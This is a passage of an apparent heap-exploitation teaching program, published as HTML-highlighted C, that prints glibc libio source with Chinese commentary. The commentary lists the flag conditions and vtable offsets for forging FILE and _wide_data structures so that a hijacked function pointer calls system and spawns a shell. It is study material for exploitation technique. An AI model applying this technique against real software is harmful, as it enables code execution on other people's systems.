class="string">&quot;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      if (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\tf-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  if (wch == WEOF)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    return _IO_do_flush (f);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  if (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    /* Buffer is really full */\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    if (_IO_do_flush (f) == EOF)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      return WEOF;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == L&#x27;\\n&#x27;))\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    if (_IO_do_flush (f) == EOF)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      return WEOF;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  return wch;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;libc_hidden_def (_IO_wfile_overflow)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们要调用的是_IO_wallocatebuf函数：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 363)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;void\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wdoallocbuf (FILE *fp)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_wide_data-&gt;_IO_buf_base)\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;    return;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_GREEN_HEAD <span class="string">&quot;!(fp-&gt;_flags &amp; _IO_UNBUFFERED)&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)    // _IO_UNBUFFERED == 0x2\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    if ((wint_t) &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot; _IO_WDOALLOCATE (fp) &quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot; != WEOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t     fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;libc_hidden_def (_IO_wdoallocbuf)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这里的_IO_WDOALLOCATE也是一个宏定义，本质就是调用_wide_data中vtable表的函数指针。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;而且_IO_Wxxx的宏定义函数调用没有检查，因此我们才能伪造这个函数指针。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以看到这个函数指针的参数是FILE结构体本身，因此如果要在此调用system，需要在FILE开头写&#x27;/bin/sh&#x27;。\n\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;伪造FILE结构体与_wide_data的几条注意点：\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;A. FILE-&gt;mode = 0 (_IO_flush_all_lockp 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;B. FILE-&gt;_IO_write_ptr &gt; FILE-&gt;_IO_write_base (_IO_flush_all_lockp 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;C. FILE-&gt;_flags &amp; 0x8 == 0 (_IO_wfile_overflow 控制流判断条件，注意_flags在FILE结构体最开头，与binsh字符串重合，因此不能直接写&#x27;/bin/sh&#x27;，本程序写入的是&#x27;  sh&#x27;)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;D. FILE-&gt;_flags &amp; 0x800 == 0 (_IO_wfile_overflow 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;E. FILE-&gt;_wode_data-&gt;_IO_write_base == 0 (_IO_wfile_overflow 控制流判断条件，_IO_write_base偏移0x18)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;F. FILE-&gt;_wide_data-&gt;_IO_buf_base == 0 (_IO_wdoallocbuf 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;G. FILE-&gt;_flags &amp; 2 != 0 (_IO_wdoallocbuf 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;H. FILE-&gt;_wide_data-&gt;_wide_vtable + 0x68 == 要执行的代码地址 (ALLOCATE函数指针偏移0x68)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(WHITE, HIGHLIGHT, <span class="string">&quot;(2) _IO_wfile_underflow_mmap 路线\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这个函数在IDA中原本是没有符号的，但通过对_IO_wdoallocbuf函数的引用分析可以定位其位置：0x860B0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;同时可以发现该函数只有1个已有的_IO_jump_t引用，偏移为0x216000 (_IO_wfile_jumps_mmap)。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;看一下这个函数对我们的FILE结构体有什么要求。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wfileops.c, line 331)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static wint_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wfile_underflow_mmap (FILE *fp)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_codecvt *cd;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const char *read_stop;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS)&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)    // _IO_NO_READS == 0x4\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_flags |= _IO_ERR_SEEN;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      __set_errno (EBADF);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  cd = fp-&gt;_codecvt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Maybe there is something left in the external buffer.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      /* No.  But maybe the read buffer is not fully set up.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       flags as appropriate.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* There is more in the external.  Convert it.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  read_stop = (const char *) fp-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_GREEN_HEAD <span class="string">&quot;fp-&gt;_wide_data-&gt;_IO_buf_base == NULL&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      /* Maybe we already have a push back pointer.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_wide_data-&gt;_IO_save_base != NULL&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  free (fp-&gt;_wide_data-&gt;_IO_save_base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;_IO_wdoallocbuf (fp);\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    fp-&gt;_wide_data-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t      fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t      &amp;read_stop,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t      fp-&gt;_wide_data-&gt;_IO_read_ptr,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t      fp-&gt;_wide_data-&gt;_IO_buf_end,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t      &amp;fp-&gt;_wide_data-&gt;_IO_read_end);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_IO_read_ptr = (char *) read_stop;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* If we managed to generate some text return the next character.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* There is some garbage at the end of the file.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __set_errno (EILSEQ);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_flags |= _IO_ERR_SEEN;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;static wint_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wfile_underflow_maybe_mmap (FILE *fp)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* This is the first read attempt.  Doing the underflow will choose mmap\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     or vanilla operations and then punt to the chosen underflow routine.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     Then we can punt to ours.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (_IO_file_underflow_maybe_mmap (fp) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return _IO_WUNDERFLOW (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其中也调用了_IO_wdoallocbuf函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此这条路径的限制条件为：\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;A. FILE-&gt;mode = 0 (_IO_flush_all_lockp 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;B. FILE-&gt;_IO_write_ptr &gt; FILE-&gt;_IO_write_base (_IO_flush_all_lockp 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;C. FILE-&gt;_flag &amp; 4 == 0 (_IO_wfile_underflow_mmap 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;D. FILE-&gt;_wide_data-&gt;_IO_read_ptr &gt;= FILE-&gt;_wide_data-&gt;_IO_read_end (_IO_wfile_underflow_mmap 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;E. FILE-&gt;_IO_read_ptr &lt; FILE-&gt;_IO_read_end (_IO_wfile_underflow_mmap 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;F. FILE-&gt;_wide_data-&gt;_IO_buf_base == NULL (_IO_wfile_underflow_mmap 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;G. FILE-&gt;_wide_data-&gt;_IO_save_base == NULL (_IO_wfile_underflow_mmap 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;H. FILE-&gt;_wide_data-&gt;_IO_buf_base == 0 (_IO_wdoallocbuf 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;I. FILE-&gt;_flags &amp; 2 != 0 (_IO_wdoallocbuf 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;J. FILE-&gt;_wide_data-&gt;_wide_vtable + 0x68 == 要执行的代码地址 (ALLOCATE函数指针偏移0x68)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(WHITE, HIGHLIGHT, <span class="string">&quot;(3) _IO_wdefault_xsgetn 路线\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这条路线有一个关键的限制条件：在进入时rdx!=0。下面通过分析将会解释这个条件的来源。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这个函数出现于4个_IO_jump_t结构体中，可以选择其一：\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;\t_IO_helper_jumps，偏移量0x215AC0\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;\t_IO_wmem_jumps，偏移量0x216180\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;\t_IO_wstr_jumps，偏移量0x215E80\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;\t_IO_wstrn_jumps，偏移量0x215DC0\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;不过需要注意的是，由于_IO_flush_all_lockp中调用的是OVERFLOW函数指针，因此需要加一个偏移才能使其调用_IO_wdefault_xsgetn。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;OVERFLOW函数指针的偏移为0x18，xsgetn的偏移为0x40，因此vtable的地址应该写入上述其中一个值+0x28。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是_IO_wdefault_xsgetn函数的定义：\n&quot;</span>);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 324)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;size_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wdefault_xsgetn (FILE *fp, void *data, &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;size_t n&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;size_t more = n;\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;  wchar_t *s = (wchar_t*) data;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  for (;;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      /* Data available. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;      if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;count &gt; 0&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if ((size_t) count &gt; more)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    count = more;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (count &gt; 20)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      fp-&gt;_wide_data-&gt;_IO_read_ptr += count;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  else if (count &lt;= 0)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    count = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      int i = (int) count;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      while (--i &gt;= 0)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t*s++ = *p++;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      fp-&gt;_wide_data-&gt;_IO_read_ptr = p;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;            &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;            more -= count;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;        &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;more == 0&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot; || &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;__wunderflow (fp) == WEOF)\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;\tbreak;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return n - more;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;libc_hidden_def (_IO_wdefault_xsgetn)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;从上面的代码就可以看出，我们为什么要让rdx!=0，这是为了使 more != 0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是__wunderflow函数的定义：\n&quot;</span>);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 250)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;wint_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__wunderflow (FILE *fp)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1))\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;    return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_mode == 0&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    _IO_fwide (fp, 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_GREEN_HEAD <span class="string">&quot;_IO_in_put_mode (fp)&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    if (&quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;_IO_switch_to_wget_mode (fp) == EOF&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (_IO_in_backup (fp))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      _IO_switch_to_main_wget_area (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn *fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (_IO_have_markers (fp))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (save_for_wbackup (fp, fp-&gt;_wide_data-&gt;_IO_read_end))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else if (_IO_have_backup (fp))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    _IO_free_wbackup_area (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return _IO_UNDERFLOW (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;libc_hidden_def (__wunderflow)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其中有一个_IO_in_put_mode宏定义：&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;#define _IO_in_put_mode(_fp) ((_fp)-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) // _IO_CURRENTLY_PUTTING == 0x800\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;再来到_IO_switch_to_wget_mode函数：\n&quot;</span>);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 390)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_switch_to_wget_mode (FILE *fp)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_GREEN_HEAD <span class="string">&quot;fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    if ((wint_t)&quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;_IO_WOVERFLOW (fp, WEOF)&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot; == WEOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (_IO_in_backup (fp))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    fp-&gt;_wide_data-&gt;_IO_read_base = 